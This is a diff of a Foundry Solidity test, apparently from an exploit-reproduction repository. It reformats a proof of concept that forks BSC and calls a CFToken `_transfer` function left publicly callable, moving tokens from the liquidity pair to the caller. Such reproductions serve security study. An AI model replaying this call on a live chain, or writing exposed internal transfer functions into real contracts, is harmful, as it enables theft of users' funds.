@@ -32,20 +32,14 @@ contract ContractTest is DSTest {
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 16841980); //fork bsc at block 16841980
+        cheats.createSelectFork("bsc", 16_841_980); //fork bsc at block 16841980
     }
 
     function testExploit() public {
-        emit log_named_uint(
-            "Before exploit, cftoken balance:",
-            ICFToken(cftoken).balanceOf(address(msg.sender))
-        );
+        emit log_named_uint("Before exploit, cftoken balance:", ICFToken(cftoken).balanceOf(address(msg.sender)));
 
-        ICFToken(cftoken)._transfer(cfpair, payable(msg.sender), 1000000000000000000000);
+        ICFToken(cftoken)._transfer(cfpair, payable(msg.sender), 1_000_000_000_000_000_000_000);
 
-        emit log_named_uint(
-            "After exploit, cftoken balance:",
-            ICFToken(cftoken).balanceOf(address(msg.sender))
-        );
+        emit log_named_uint("After exploit, cftoken balance:", ICFToken(cftoken).balanceOf(address(msg.sender)));
     }
 }
